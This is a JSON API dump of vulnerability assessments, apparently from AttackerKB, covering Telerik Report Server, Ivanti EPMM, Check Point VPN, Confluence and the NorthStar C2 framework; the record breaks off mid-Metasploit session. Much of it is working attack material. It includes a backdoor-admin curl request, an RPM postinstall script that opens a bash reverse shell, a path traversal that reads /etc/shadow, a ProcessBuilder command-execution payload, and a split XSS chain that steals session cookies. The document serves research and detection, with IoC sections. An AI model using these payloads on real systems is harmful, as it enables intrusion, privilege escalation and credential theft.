{"links":{"next":{"href":"/v1/assessments?page=1\u0026size=10"},"self":{"href":"/v1/assessments"}},"data":[{"id":"20d30f34-ff47-402d-9991-678b34b3fbb4","editorId":"2dc5dd1e-c295-4dd9-bd7b-f3b77d6dbda5","topicId":"b3be8a7a-b4bf-47ac-842a-d2367cf3c3d5","created":"2024-06-03T18:57:19.331193Z","revisionDate":"2024-06-05T15:09:08.867535Z","document":"So far, 2024 has seen a few notable vulnerabilities, such as [CVE-2024-1709](https://www.rapid7.com/blog/post/2024/02/20/etr-high-risk-vulnerabilities-in-connectwise-screenconnect/), that attack setup wizard flows for authentication bypass. This vulnerability, [discovered by researcher Sina Kheirkhah](https://summoning.team/blog/progress-report-server-rce-cve-2024-4358-cve-2024-1800/), falls into the same group. By exploiting an access control vulnerability in the administrator setup wizard, unauthenticated attackers gain high-privileged access to Telerik Report Server. With the newly-acquired administrator account, another new Report Server vulnerability, tracked as [CVE-2024-1800](https://attackerkb.com/topics/VcIY8WcbW3/cve-2024-1800), can be leveraged for remote code execution on the host system. \r\n\r\n### Exploitation\r\nThe initial administrator setup code in `Telerik.ReportServer.Web.dll!Telerik.ReportServer.Web.Controllers.StartupController.Register` does not check if setup has already been completed. As a result, the attacker can manually perform the web request to create a new administrator account. Per Sina's public [proof of concept](https://raw.githubusercontent.com/sinsinology/CVE-2024-4358/main/CVE-2024-4358.py), the authentication bypass vulnerability can be exploited with a single request:\r\n`curl 'http://TARGET_HERE/Startup/Register' -d 'Username=USERNAME_HERE\u0026Password=PASSWORD_HERE\u0026ConfirmPassword=PASSWORD_HERE\u0026Email=backdoor%40admin.com\u0026FirstName=backdoor\u0026LastName=user'`\r\n\r\n\r\n### Public Exposure\r\nIt's worth mentioning that Shodan only appears to return a few hundred public-facing Telerik Report Server instances. However,  due to the unauthenticated RCE impact, organizations running the Report Server would be wise to patch with urgency. The [Progress Knowledge Base](https://docs.telerik.com/report-server/knowledge-base/registration-auth-bypass-cve-2024-4358) contains guidance on how to remediate this vulnerability.","score":3,"metadata":{"mitre-tactics":"Initial Access","attacker-value":5,"exploitability":5},"tags":[{"id":"067ecf0c-8227-4437-bc04-a92d84b545bb"},{"id":"8f7ef49d-26f4-46b1-9676-599f6669f4d3"},{"id":"240789d2-3e0b-4967-a6a4-8f09029f642d"},{"id":"02c27d86-7690-4074-8f1e-dead30c1e2fa"}]},{"id":"8e941ab8-690f-4125-b598-9a8ff7d935f0","editorId":"de2686f1-1a8a-4518-8379-12188d859523","topicId":"b05620a8-15ae-4b38-9311-8081500d2630","created":"2024-06-03T18:32:44.391433Z","revisionDate":"2024-06-05T15:09:11.912937Z","document":"Ivanti EPMM (previously known as MobileIron Core) is vulnerable to a local privilege escalation vulnerability. The `install` command accessible from the `MobileIron CORE CLI` or `Ivanti EPMM CLI` allows privileged CLI users to install .rpm packages. Affected versions are versions prior to `12.1.0.0`, `12.0.0.0`, and `11.12.0.1`.\r\n\r\nThe `install` command fails to enforce signature verification or URL filtering of any sort when installing rpm from url allowing an attacker to host a malicious rpm package and have their victim download and install it with root privileges. \r\n\r\nThere exists an `install` binary on the on the affected appliance - please note that it is unrelated to the `install` command accessible from the CLI which is vulnerable to the priv esc:\r\n```\r\nwhich install\r\n/bin/install\r\ninstall --help\r\nUsage: install [OPTION]... [-T] SOURCE DEST\r\n  or:  install [OPTION]... SOURCE... DIRECTORY\r\n  or:  install [OPTION]... -t DIRECTORY SOURCE...\r\n  or:  install [OPTION]... -d DIRECTORY...\r\n\r\nThis install program copies files (often just compiled) into destination\r\nlocations you choose.  If you want to download and install a ready-to-use\r\npackage on a GNU/Linux system, you should instead be using a package manager\r\nlike yum(1) or apt-get(1).\r\n```\r\n\r\nTo access the vulnerable command, one must first gain CLI access via SSH or physical access\r\n```\r\n➜ ssh msfuser@172.16.199.40\r\nmsfuser@172.16.199.40's password:\r\nLast login: Mon Jun  3 14:12:12 2024 from 172.16.199.1\r\n************************************************************\r\n*                   MobileIron CORE CLI                    *\r\n*                                                          *\r\n*                                                          *\r\n************************************************************\r\nWelcome msfuser it is Mon Jun 3 15:00:14 UTC 2024\r\nCORE(11.2.0.0-31)@lobster.example.com\u003e\r\n\r\n  enable      Turn on privileged commands\r\n  exit        Exit from the EXEC\r\n  help        Description of the interactive help system\r\n  host        Query Internet name servers\r\n  logout      Exit from the EXEC\r\n  ping        Send echo messages\r\n  show        Show running system information\r\n  speedtest   Performs speed test for disk memory and cpu\r\n  timeout     CLI Idle timeout.\r\n  traceroute  Trace route to destination\r\n```\r\n\r\nThen turn on privileged commands with `enable` followed by the correct Admin CLI password:\r\n```\r\nCORE(11.2.0.0-31)@lobster.example.com\u003e enable\r\nPassword:\r\nCORE(11.2.0.0-31)@lobster.example.com#install\r\n\r\n  rpm  Gets the rpm and install. choose any from: cdrom file info url\r\n\r\nCORE(11.2.0.0-31)@lobster.example.com#install rpm\r\n\r\n  cdrom  Gets the rpm and install from cdrom\r\n  file   Get and show the rpm(s) from the given file path and installs\r\n  info   Gets list of rpms installed\r\n  url    Gets the rpm and install from the given url\r\n\r\n```\r\n\r\nAs outlined by securekomodo in the following [blog post](https://www.redlinecybersecurity.com/blog/exploiting-cve-2024-22026-rooting-ivanti-epmm-mobileiron-core) the CLI command `install` is really just a wrapper for the command: \r\n```\r\n/bin/rpm -Uvh *.rpm\r\n```\r\nWhich will get run as root, allowing an attacker to host a malicious RPM package, install it and successfully escalate privileges.\r\n# Example PoC \r\n\r\nCreate a `postinstall.sh` script that will run as root after the .rpm package gets installed. Include your payload. \r\n```\r\nmsfuser@msfuser-virtual-machine:~/CVE-2024-22026$ cat postinstall.sh\r\n#!/bin/sh\r\nbash -i \u003e\u0026 /dev/tcp/172.16.199.131/443 0\u003e\u00261\r\nexit 0\r\n```\r\n\r\nCreate the malicious .rpm package using the Ruby gem `fpm`:\r\n```\r\nmsfuser@msfuser-virtual-machine:~/CVE-2024-22026$ fpm -s dir -t rpm -n test-poc -v 2.0 -a i386 --description \"MobileIron Reverse Shell\" --maintainer \"msfuser\" --after-install postinstall.sh -C .\r\nCreated package {:path=\u003e\"test-poc-2.0-1.i386.rpm\"}\r\n```\r\n\r\nHost the .rpm package via a Python HTTP server:\r\n```\r\nmsfuser@msfuser-virtual-machine:~/CVE-2024-22026$ sudo python3 -m http.server 80\r\n[sudo] password for msfuser:\r\nServing HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...\r\n```\r\n\r\nStart a `nc` listener on our attacking machine:\r\n```\r\nmsfuser@msfuser-virtual-machine:~/CVE-2024-22026$ sudo nc -l 443\r\n[sudo] password for msfuser:\r\n```\r\n\r\nAs previously demonstrated SSH to the vulnerable appliance or physically access theMobile Iron Core / Ivanti EPMM CLI and type `enable` followed by the Admin password in order to enable privileged commands. Once successfully authenticated use the vulnerable command to download and install the .rpm in the context of the root user. \r\n```\r\nCORE(11.2.0.0-31)@lobster.example.com#install rpm url http://172.16.199.131/test-poc-2.0-1.i386.rpm\r\n--2024-06-03 16:04:48--  http://172.16.199.131/test-poc-2.0-1.i386.rpm\r\nConnecting to 172.16.199.131:80... connected.\r\nHTTP request sent, awaiting response... 200 OK\r\nLength: 49796 (49K) [application/x-redhat-package-manager]\r\nSaving to: 'test-poc-2.0-1.i386.rpm'\r\n\r\n100%[====================================================================================================================================================================================================================\u003e] 49,796      --.-K/s   in 0.001s\r\n\r\n2024-06-03 16:04:48 (32.7 MB/s) - 'test-poc-2.0-1.i386.rpm' saved [49796/49796]\r\n\r\nPreparing...                          ################################# [100%]\r\n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\r\n                                 Dload  Upload   Total   Spent    Left  Speed\r\n100   469  100   469    0     0   279k      0 --:--:-- --:--:-- --:--:--  458k\r\nUpdating / installing...\r\n   1:test-poc-2.0-1                   ################################# [100%]\r\n```\r\n\r\nCheck the `nc` listener and see that we've received a shell running in the context of the root user. \r\n```\r\nmsfuser@msfuser-virtual-machine:~/CVE-2024-22026$ sudo nc -l 443\r\n[sudo] password for msfuser:\r\n[root@lobster.example.com 2024-06-03--16-30-57 / #] id\r\nid\r\nuid=0(root) gid=0(root) groups=0(root)\r\n[root@lobster.example.com 2024-06-03--16-42-52 / #] uname -a\r\nuname -a\r\nLinux lobster.example.com 3.10.0-1160.6.1.el7.x86_64 #1 SMP Tue Nov 17 13:59:11 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux\r\n```\r\n\r\nTo reset the target in order to retest, simply remove the package you just installed with: \r\n```\r\nCORE(11.2.0.0-31)@lobster.example.com#no install rpm test-poc-2.0-1.i386\r\nUninstalled  ivanti-privesc-13.37-1.i386 successfully.\r\n```\r\n# IoCs\r\n\r\nUnprivileged users can query logs from the Mobile Iron / Ivanti EPMM CLI. One way users can check for IoCs in by issuing the following command:\r\n```\r\nCORE(11.2.0.0-31)@lobster.example.com\u003e show log messages\r\n--log 'messages' --\r\n```\r\n\r\nThe above command will allow the user to access `/var/log/messages` via the CLI. The below isn't indicative of a successful exploit attempt, the following log lines will be present on a device where the user has installed malicious or trusted RPM packages using the CLI. \r\n```\r\nJun  3 16:51:51 lobster installTools: Command: /bin/rpm -Uvh *.rpm successful\r\nJun  3 16:51:51 lobster installTools: Command: /bin/ls *.rpm  \u003e\u003e /mi/files/installedTools successful\r\nJun  3 16:51:52 lobster installTools: Command: /bin/rm * \u003e\u0026 /dev/null successful\r\nJun  3 16:51:52 lobster installTools: Command: popd \u003e\u0026 /dev/null successful\r\nJun  3 16:51:52 lobster installTools: RPM downloaded and installed successfully\r\n```\r\n\r\nInterestingly enough, it doesn't seem this command completes successfully, despite it saying that it does.  There is no reference to our malicious .rpm file in the file `/mi/files/installedTools`\r\n```\r\nJun  3 16:51:51 lobster installTools: Command: /bin/ls *.rpm  \u003e\u003e /mi/files/installedTools successful\r\n```\r\nIt gets created but is zero bytes:\r\n```\r\n[root@lobster.example.com 2024-06-03--17-31-48 files #] ls -l /mi/files/installedTools\r\nls -l /mi/files/installedTools\r\n-rw-r--r-- 1 root root 0 Jun  3 17:27 /mi/files/installedTools\r\n```\r\n\r\nAlso one can look at the current processes for tell tale signs of successful exploitation by running:\r\n```\r\n[root@lobster.example.com 2024-06-03--17-35-43 files #] ps aux\r\nps aux\r\nUSER        PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\r\n...\r\nroot      63342  0.0  0.0 137500  5536 pts/0    S    17:27   0:00 /usr/bin/sudo /mi/bin/installTools url http://172.16.199.131/test-poc-2.0-1.i386.rpm\r\nroot      63345  0.0  0.0   9700  1584 pts/0    S    17:27   0:00 /bin/bash /mi/bin/installTools url http://172.16.199.131/test-poc-2.0-1.i386.rpm\r\nroot      63407  0.0  0.1  78976 10308 pts/0    S    17:27   0:00 /bin/rpm -Uvh test-poc-2.0-1.i386.rpm\r\nroot      63408  0.0  0.0   9564  1124 pts/0    S    17:27   0:00 /bin/sh /var/tmp/rpm-tmp.D6MXUG 1\r\nroot      63409  0.0  0.0 116004  2684 pts/0    S    17:27   0:00 bash -i\r\n```\r\n\r\nWe can see that processes that were spawned in order to download and install our malicious rpm are still running. \r\nIf we get the PID from the reverse shell we confirm `63409` in the above is our reverse shell and the sink of our exploit.\r\n```\r\n[root@lobster.example.com 2024-06-03--17-37-12 files #] echo \"My PID is $$\"\r\necho \"My PID is $$\"\r\nMy PID is 63409\r\n```\r\n\r\nIf we run the following we can get a bit more detail of the context of the root process spawned when this is exploited:\r\n```\r\n[root@lobster.example.com 2024-06-03--17-58-29 var #] ps auxe | grep 63409\r\nps auxe | grep 63409\r\nroot      63409  0.0  0.0 116004  2704 pts/0    S    17:27   0:00 bash -i XDG_SESSION_ID=2903 MI_DATE_FORMAT=%Y-%m-%d--%H-%M-%S TERM=xterm-256color SHELL=/bin/bash MI_DATE_COMMAND=date +%Y-%m-%d--%H-%M-%S USER=root SUDO_USER=msfuser SUDO_UID=2002 USERNAME=root RPM_INSTALL_PREFIX0=/ MAIL=/var/mail/root PATH=/sbin:/bin:/usr/sbin:/usr/bin:/usr/X11R6/bin _=/bin/bash PWD=/ JAVA_HOME=/usr/java/default HOME=/root SUDO_COMMAND=/mi/bin/installTools url http://172.16.199.131/test-poc-2.0-1.i386.rpm SHLVL=2 RPM_INSTALL_PREFIX=/ LOGNAME=root SUDO_GID=1001\r\n\r\n```\r\n\r\n\r\n# Attacker Value and Exploitability Rating\r\n\r\nI gave this vulnerability an attacker rating of 1/5 mainly due to the fact authentication to the CLI is required as well as the CLI Admin password in order to enable privileged commands to access the vulnerable command `install`. \r\n\r\nOnce the necessary credentials are obtained exploitation is straightforward: host the malicious package for the victim to download and install, then profit. However the need for such high credentials makes this vulnerability difficult to exploit in the real world.\r\n\r\n","score":2,"metadata":{"attacker-value":1,"exploitability":3},"tags":[{"id":"392ac474-91f1-4944-ad4f-78ce648b2df7"},{"id":"8f7ef49d-26f4-46b1-9676-599f6669f4d3"},{"id":"02c27d86-7690-4074-8f1e-dead30c1e2fa"},{"id":"b65c2492-bb05-477a-86bb-0c9569f80141"},{"id":"0e696d6d-665a-48bd-9636-06d0a3a2a211"}]},{"id":"ad36fea3-37bf-43b3-a5d3-1e4715d23ecb","editorId":"4a5ca587-a819-49f8-91eb-07b9c2a708fe","topicId":"b945590f-46f3-47c5-b1d3-f391465110e0","created":"2024-05-30T21:44:32.388871Z","revisionDate":"2024-06-02T17:35:59.986398Z","document":"This is trivial to exploit. The vulnerability at its core is a directory traversal vulnerability that allows for full access to files on the Check Point VPN device/service. It also appears that this an unauthenticated vulnerability and given that these servers will by their very nature be publicly exposed, significantly increases the risk of this vulnerability.\r\n\r\n## Exploit\r\nThe exploit itself, as mentioned above is trivial to exploit. An example is shown on [https://labs.watchtowr.com/check-point-wrong-check-point-cve-2024-24919/](https://labs.watchtowr.com/check-point-wrong-check-point-cve-2024-24919/):\r\n\r\n### Request\r\n```\r\nPOST /clients/MyCRL HTTP/1.1\r\nHost: \u003credacted\u003e\r\nContent-Length: 39\r\n\r\naCSHELL/../../../../../../../etc/shadow\r\n```\r\n\r\n### Response\r\n```\r\nHTTP/1.0 200 OK\r\nDate: Thu, 30 May 2024 01:38:29 GMT\r\nServer: Check Point SVN foundation\r\nContent-Type: text/html\r\nX-UA-Compatible: IE=EmulateIE7\r\nConnection: close\r\nX-Frame-Options: SAMEORIGIN\r\nStrict-Transport-Security: max-age=31536000; includeSubDomains\r\nContent-Length: 505\r\n\r\nadmin:$6$rounds=10000$N2We3dls$xVq34E9omWI6CJfTXf.4tO51T8Y1zy2K9MzJ9zv.jOjD9wNxG7TBlQ65j992Ovs.jDo1V9zmPzbct5PiR5aJm0:19872:0:99999:8:::\r\nmonitor:*:19872:0:99999:8:::\r\nroot:*:19872:0:99999:7:::\r\nnobody:*:19872:0:99999:7:::\r\npostfix:*:19872:0:99999:7:::\r\nrpm:!!:19872:0:99999:7:::\r\nshutdown:*:19872:0:99999:7:::\r\npcap:!!:19872:0:99999:7:::\r\nhalt:*:19872:0:99999:7:::\r\ncp_postgres:*:19872:0:99999:7:::\r\ncpep_user:*:19872:0:99999:7:::\r\nvcsa:!!:19872:0:99999:7:::\r\n_nonlocl:*:19872:0:99999:7:::\r\nsshd:*:19872:0:99999:7:::\r\n```\r\n\r\nUsing this, an attacker would be able to gain access to sensitive data on the server, such as the configuration for the VPN service.\r\n","score":1,"metadata":{"mitre-tactics":"Initial Access","attacker-value":5,"exploitability":5},"tags":[{"id":"19076e68-1c52-48c1-bc15-7f6a3053c357"},{"id":"067ecf0c-8227-4437-bc04-a92d84b545bb"},{"id":"791283de-d643-4ede-850e-91a6edb897db"},{"id":"8f7ef49d-26f4-46b1-9676-599f6669f4d3"},{"id":"240789d2-3e0b-4967-a6a4-8f09029f642d"}]},{"id":"1b3e554c-47a1-40f1-a09a-ea867bb4f8a4","editorId":"2dc5dd1e-c295-4dd9-bd7b-f3b77d6dbda5","topicId":"b945590f-46f3-47c5-b1d3-f391465110e0","created":"2024-05-30T17:07:18.268994Z","revisionDate":"2024-05-30T17:30:16.120664Z","document":"On May 28, 2024, Check Point published an advisory for an unauthenticated information disclosure vulnerability affecting Check Point Security Gateway devices configured with either the “IPSec VPN” or “Mobile Access” software blade. This vulnerability was stated as being a vulnerability impacting devices with password-only authentication enabled on some accounts. However, upon analysis, CVE-2024-24919 was discovered to be an unauthenticated arbitrary file read as root. Though attackers may steal credential files to crack account password hashes, CVE-2024-24919 also impacts systems that are not configured for password-only authentication.\r\n\r\nThis vulnerability should be urgently addressed by anyone running a Check Point Security Gateway with the IPSec VPN or Mobile Access blades enabled. Additionally, organizations should reference the [Rapid7 blog post](https://www.rapid7.com/blog/post/2024/05/30/etr-cve-2024-24919-check-point-security-gateway-information-disclosure/) for this vulnerability for remediation and detection recommendations. As of May 30, 2024, CVE-2024-24919 has been added to CISA's [KEV](https://www.cisa.gov/known-exploited-vulnerabilities-catalog) catalog.","score":2,"metadata":{"attacker-value":5,"exploitability":4},"tags":[{"id":"19076e68-1c52-48c1-bc15-7f6a3053c357"},{"id":"392ac474-91f1-4944-ad4f-78ce648b2df7"},{"id":"067ecf0c-8227-4437-bc04-a92d84b545bb"},{"id":"791283de-d643-4ede-850e-91a6edb897db"},{"id":"8f7ef49d-26f4-46b1-9676-599f6669f4d3"},{"id":"240789d2-3e0b-4967-a6a4-8f09029f642d"}]},{"id":"5ad314a1-9fd7-47d7-835f-f29680b3961d","editorId":"1754d880-537c-48c4-8738-5ad2ccde5258","topicId":"03c38025-45aa-42fd-81cf-1d717e8ba8d7","created":"2024-05-28T21:20:56.756545Z","revisionDate":"2024-06-05T15:10:56.04904Z","document":"This vulnerability can be leveraged by an authenticated attacker to execute OS commands within the context of the Confluence application server. The authenticated user must have the \"Confluence Administrator\" global permission. By default, this permission is only granted to the `confluence-administrators` group.\r\n\r\nTo leverage this vulnerability, the user would login to Confluence, then:\r\n\r\n1. Navigate to General Configuration \u003e Configure Code Macro\r\n1. Select \"Add a new language\"\r\n1. Provide a javascript file to execute, using `java.lang.ProcessBuilder` to run an arbitrary command\r\n1. Specify an arbitrary language name\r\n1. Press the \"Add\" button\r\n\r\nOnce the \"Add\" button is pressed, there will likely be an error message displayed in the UI stating that the uploaded language file is invalid. Despite this error message, the Javascript code is executed. The language fails to be added so there is no language to clean up.\r\n\r\n**exploit.js**\r\nThe following exploit.js source file will echo the current user information to `/tmp/output`.\r\n```\r\nnew java.lang.ProcessBuilder[\"(java.lang.String[])\"]([\"/usr/bin/sh\", \"-c\", \"echo $(id) \u003e /tmp/output\"]).start()\r\n```\r\n\r\nOriginal source from: https://github.com/W01fh4cker/CVE-2024-21683-RCE/blob/main/exploit.js\r\n","score":2,"metadata":{"attacker-value":2,"exploitability":5},"tags":[{"id":"392ac474-91f1-4944-ad4f-78ce648b2df7"},{"id":"067ecf0c-8227-4437-bc04-a92d84b545bb"},{"id":"02c27d86-7690-4074-8f1e-dead30c1e2fa"},{"id":"b65c2492-bb05-477a-86bb-0c9569f80141"},{"id":"0e696d6d-665a-48bd-9636-06d0a3a2a211"}]},{"id":"0e9af56e-90c5-4900-8384-9d33bdfe7e26","editorId":"de2686f1-1a8a-4518-8379-12188d859523","topicId":"480db1ba-7e3b-45b6-8b88-93847da9270e","created":"2024-05-22T21:52:42.995757Z","revisionDate":"2024-06-05T15:14:22.495531Z","document":" [NorthStarC2]([https://github.com/EnginDemirbilek/NorthStarC2](https://github.com/EnginDemirbilek/NorthStarC2)) is an open source web based command and control framework used by real world threat actors including [UNC3890](https://www.mandiant.com/resources/blog/suspected-iranian-actor-targeting-israeli-shipping), [APT33](https://exchange.xforce.ibmcloud.com/collection/Recent-Hive0016-Infrastructure-and-Use-of-NorthStarC2-Pentest-Framework-77196fe57bb122088c210286da5d5b20) and [Patchwork/APT-Q-36](https://www.sangfor.com/farsight-labs-threat-intelligence/cybersecurity/may-hot-apt-security-events-techniques-tracker) to name a few. NorthStar C2, prior to commit `7674a44` on March 11 2024, contains a vulnerability where the logs page is\r\nvulnerable to a stored XSS. An unauthenticated user can simulate an agent registration to cause the XSS and take over a user's session. With this access, it is then possible to run a new payload on all of the NorthStar C2 compromised hosts (agents), and kill the original agent.\r\n\r\n# Obtaining Unauthenticated Stored XSS \r\n\r\nA route exists such that a portion of an unauthenticated request would be persistently reflected on the admin web panel without sanitization, allowing for stored XSS. Before delving into the exploitation details, let's understand the NorthStar C2 stager registration flow. The docs state:\r\n\r\n\u003eThe stager registration process consists of 2 phases;\r\n\u003e\r\n\u003eFirst phase:\r\n\u003e\r\nNorthStar Stager sends an unique id value to login.php with HTTP POST method. This value is XORed with a hard-coded key and is in base64 format.\r\nThe C2 Server decrypts this value and checks if the unique id starts with a \"N\", ends with a \"q\" and is less than 20 characters.If everything checks out, the value is registered into the C2 database.\r\nA second XOR key, which will be used for communications, is transferred from NorthStar C2 Server to NorthStar Stager.\r\nNorthStar Stager receives and registers the XOR key.\r\n\r\nThe registration routes mentioned above are accessible prior to authentication (which is by the design). According to the docs, some checks are conducted to determine a valid ID, but there is no mention of any additional sanitation. The implementation of these checks in the code can be examined inside the following file:\r\n\r\n`NorthStarC2/chcksid.php`\r\n![checksid.php](https://github.com/rapid7/metasploit-framework/assets/23320005/5cd510ab-c376-40b5-a2d4-9daeb0f17364)\r\n\r\nThe agent ID (or the `$_POST['sid']` parameter in the above code which is saved to the `$str` variable) has no real strict sanitization.  The agent ID is checked to ensure the first character is `N`, the last character is `q` and that the length is less than `20` - these loosely made checks can be exploited.\r\n\r\nTracing the path of this parameter to its sink leads us to the `login.php` file, where the `checksid.php` file is included and the `$str` variable is used. Notice how there is no further sanitization performed here:\r\n\r\n`NorthStarc2/login/php`:\r\n![login.php](https://github.com/rapid7/metasploit-framework/assets/23320005/58770795-889e-42cd-82ae-985acc2be9dd)\r\n\r\nThe `updateLogs` function inserts the `$str` parameter (which is now called `$logClient`) directly into the database:\r\n\r\n`NorthStarC2/functions/updateLogs.function.php`\r\n![update_logs](https://github.com/rapid7/metasploit-framework/assets/23320005/8d18c535-dabe-446c-b2b0-2d26814123e9)\r\n\r\nNow in order to exploit this stored XSS vulnerability we must determine where the database is queried and what page displays the information we're able to store in the database. \r\n\r\nThe file `logs.php` queries the database and displays the unfiltered output directly to the webpage:\r\nThe `agentID` (in this case `logClient`) can be seen being echoed to the page without sanitization:\r\n\r\n`NorthStarC2/logs.php`:\r\n![logs.php](https://github.com/rapid7/metasploit-framework/assets/23320005/497f483f-4347-4f06-b9d2-0734c46fa5a9)\r\n\r\nIf there was no length limitation on the agentID parameter, we would be able to send the following payload:\r\n```js\r\nN\u003cscript\u003ealert(1)\u003c/script\u003eq\r\n```\r\nand obtain stored XSS with ease. However the above payload is 26 characters and will not be accepted by the application. \r\n\r\nSo, in order to work around this limitation, javascript comments can be used to connect multiple, shorter payloads. Because the newest logs appear at the top of the table, the last part of the payload is sent first.\r\n\r\nFor example, in order to create the 26 character stored XSS payload mentioned above, the following three payload can be sent in this order, remembering that they all need to start with `N`, end with `q` and be less than 20 characters:\r\n\r\nPayload #1:\r\n```js\r\nN*/\u003c/script\u003eq\r\n```\r\n\r\nPayload #2:\r\n```js\r\nN*/alert(1)/*q\r\n```\r\n\r\nPayload #3:\r\n```js\r\nN\u003cscript\u003e/*q\r\n```\r\n\r\nThe payload will appear like so in the DOM:\r\n```js\r\nN\u003cscript\u003e/*qN*/alert(1)/*qN*/\u003c/script\u003eq\r\n```\r\n\r\nand voila, stored XSS can be achieved. \r\n\r\n# Stealing Cookies\r\n\r\nRequests to the NorthStarC2 web application are authenticated by the `PHPSESSID` cookie. By using the stored XSS vulnerability outlined above, we can exfiltrate the `PHPSESSID` cookie value of an admin user back to the attacker machine. With that cookie in our possession we can take control of all the agents connected to the NorthStarC2 application and run arbitrary commands on all agents connected to the NorthStarC2 application. \r\n\r\nThis is an array of payloads (in the specific reverse order such that they get echoed to the page in the correct order) that can send to the application in order to steal the `PHPSESSID` cookie: \r\n```python\r\nsid_payloads = [\"N*/\u003c/script\u003e\u003cq\", \"N*/i.src=u/*q\", \"N*/new Image;/*q\", \"N*/var i=/*q\", \"N*/s+h+p+'/'+c;/*q\", \"N*/var u=/*q\", f\"N*/'{protocol}';/*q\", \"N*/var s=/*q\", f\"N*/':{port}';/*q\", \"N*/var p=/*q\", \"N*/a+b;/*q\", \"N*/var h=/*q\", f\"N*/'{h2}';/*q\", \"N*/var b=/*q\", f\"N*/'{h1}';/*q\", \"N*/var a=/*q\", \"N*/d.cookie;/*q\", \"N*/var c=/*q\", \"N*/document;/*q\", \"N*/var d=/*q\", \"N\u003c/td\u003e\u003cscript\u003e/*q\"]\r\n```\r\n\r\nThis is how it will appear once echoed to the DOM of the logs page: \r\n```js\r\nN\u003c/td\u003e\u003cscript\u003e/*qN*/var d=/*qN*/document;/*qN*/var c=/*qN*/d.cookie;/*qN*/var a=/*qfN*/'{h1}';/*qN*/var b=/*qfN*/'{h2}';/*qN*/var h=/*qN*/a+b;/*qN*/var p=/*qfN*/':{port}';/*qN*/var s=/*qfN*/'{protocol}';/*qN*/var u=/*qN*/s+h+p+'/'+c;/*qN*/var i=/*qN*/new Image;/*qN*/i.src=u/*qN*/\u003c/script\u003e\u003cq\r\n```\r\n\r\nAnd this is the actual javascript code in readable form, without the comments and the `q`'s and the `N`'s required by the sanitization:\r\n```js\r\n\u003c/td\u003e\u003cscript\u003e\r\nvar d=document;\r\nvar c=d.cookie;\r\nvar a='{h1}';\r\nvar b='{h2}';\r\nvar h=a+b;\r\nvar p=':{port}';\r\nvar s='{protocol}';\r\nvar u=s+h+p+'/'+c;\r\nvar i=new Image;\r\ni.src=u;\r\n\u003c/script\u003e\r\n```\r\n\r\nOnce the cookie has been obtained, attackers can use it to interact with the web panel as an authenticated user, which gives them the ability to execute arbitrary commands on all the agents. \r\n# Required User Interaction\r\nNote that the javascript payload will only get run once an authenticated user navigates to the `logs.php` page. The `logs.php` page does refresh itself periodically so if an operator already has the logs page open it might fire without someone directly opening it, in that specific scenario. \r\n\r\n# IoCs\r\n\r\nIf you're running an instance of NorthStar C2, prior to commit `7674a44` on March 11 2024 and you'd like to see if you've been affected, one way would be to connect to the database that was configured to be used by the application (depending on how your database is setup the command to connect could be similar to `sudo mysql -u root -p` ) and run `select * from logs;` once using the specific database. \r\n\r\nBelow is a screenshot of an affected host. Notice how in the `logClient` column in rows 1 through 13 appear to be normal but then rows 14 through 34 all appear to include `N*/\u003cjavascript code\u003e/*q`. This is where the attacker has stored, the Stored XSS and is the very code used to steal the admin session cookie and exfiltrate it to themselves.\r\n![ioc_dataabse](https://github.com/rapid7/metasploit-framework/assets/23320005/0b801896-673c-4c19-a6a5-9d690f992b0f)\r\n\r\nOn an affected system, it is likely that the affected database rows would still be there as this attack gives the attacker control over the agents connected to the host and not to the host itself which is running the database in question. So it would be non-trivial for the attacker to erase these footsteps in this scenario. \r\n\r\n# Metasploit Module Demo\r\nTesting NorthstarStager.exe compiled on Windows 10 (19045) connected to NorthstarC2 installed on Ubuntu 22.04. Both the host and agent running on the vulnerable commit `e7fdce148b6a81516e8aa5e5e037acd082611f73`\r\n```\r\nmsf6 exploit(windows/http/northstar_c2_xss_to_agent_rce) \u003e options\r\n\r\nModule options (exploit/windows/http/northstar_c2_xss_to_agent_rce):\r\n\r\n   Name       Current Setting  Required  Description\r\n   ----       ---------------  --------  -----------\r\n   KILL       false            no        Kill the NorthStar C2 agent\r\n   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]\r\n   RHOSTS     172.16.199.131   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html\r\n   RPORT      80               yes       The target port (TCP)\r\n   SRVHOST    172.16.199.1     yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.\r\n   SRVPORT    8080             yes       The local port to listen on.\r\n   SSL        false            no        Negotiate SSL/TLS for outgoing connections\r\n   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)\r\n   TARGETURI  /                yes       The URI of the NorthStar C2 Application\r\n   URIPATH    /                no        The URI to use for this exploit (default is random)\r\n   VHOST                       no        HTTP server virtual host\r\n\r\n\r\nPayload options (cmd/windows/http/x64/meterpreter/reverse_tcp):\r\n\r\n   Name                Current Setting  Required  Description\r\n   ----                ---------------  --------  -----------\r\n   EXITFUNC            process          yes       Exit technique (Accepted: '', seh, thread, process, none)\r\n   FETCH_COMMAND       CERTUTIL         yes       Command to fetch payload (Accepted: CURL, TFTP, CERTUTIL)\r\n   FETCH_DELETE        false            yes       Attempt to delete the binary after execution\r\n   FETCH_FILENAME      KNBXoiAeeq       no        Name to use on remote system when storing payload; cannot contain spaces or slashes\r\n   FETCH_SRVHOST       172.16.199.1     no        Local IP to use for serving payload\r\n   FETCH_SRVPORT       9090             yes       Local port to use for serving payload\r\n   FETCH_URIPATH                        no        Local URI to use for serving payload\r\n   FETCH_WRITABLE_DIR  %TEMP%           yes       Remote writable dir to store payload; cannot contain spaces.\r\n   LHOST               172.16.199.1     yes       The listen address (an interface may be specified)\r\n   LPORT               4444             yes       The listen port\r\n\r\n\r\nExploit target:\r\n\r\n   Id  Name\r\n   --  ----\r\n   0   Automatic Target\r\n\r\n\r\n\r\nView the full module info with the info, or info -d command.\r\n\r\nmsf6 exploit(windows/http/northstar_c2_xss_to_agent_rce) \u003e run\r\n[*] Exploit running as background job 2.\r\n[*] Exploit completed, but no session was created.\r\n\r\n[*] Started reverse TCP handler on 172.16.199.1:4444\r\n[*] Running automatic check (\"set AutoCheck false\" to disable)\r\n[!] The service is running, but could not be validated. NorthStar Login page detected\r\n[*] Using URL: http://172.16.199.1:8080/\r\n[*] Server started.\r\nmsf6 